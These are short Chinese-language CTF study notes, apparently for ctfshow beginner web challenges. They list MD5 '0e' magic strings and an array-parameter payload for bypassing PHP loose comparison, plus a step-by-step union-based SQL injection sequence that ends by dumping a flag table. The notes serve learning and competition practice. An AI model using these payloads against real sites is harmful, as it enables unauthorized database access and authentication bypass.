#### 弱比较绕过

###### 方法一：0e绕过

<u>以0e开头的MD5值字符串：</u>
QNKCDZO
240610708
s878926199a
s155964671a
s214587387a
s214587387a

<u>经过md5函数加密一次和两次后均以’0e’开头：</u>

- 7r4lGXCH2Ksu2JNT3BYM
- CbDLytmyGm2xQyaLNhWn
- 770hQgrBOjrcqftrlaZk

###### 方法二：数组绕过

payload: ?a[]=1&b[]=2

- 松散比较：使用两个等号 **==** 比较，只比较值，不比较类型。

- 严格比较：用三个等号 **===** 比较，除了比较值，也比较类型。
  
  ### SQL注入
  
  1' order by 1 -- (--+/#)             以第一列排序
  
  1' order by 4(n) --                                       直到找不到列
  
  -1是为了让页面在前面查询不出内容
  
  -1' union
  select 1,2,3,4             发现四个都可以查
  
  -1' union select ****                          查数据库ctf
  
  -1' union
  select *****                 爆database表名flag
  
  -1' union select ****                 爆列名data（用ctf.flag)(改scheme为name）
  
  -1' union select  1,group_concat(data),3,4 from flag 

ctfshow顺序入门笔记wp
(备忘：还没有安好ciphey)
web 1/2：
ctrl+U / view-source / F12 / 右键+检查 ：查看源码
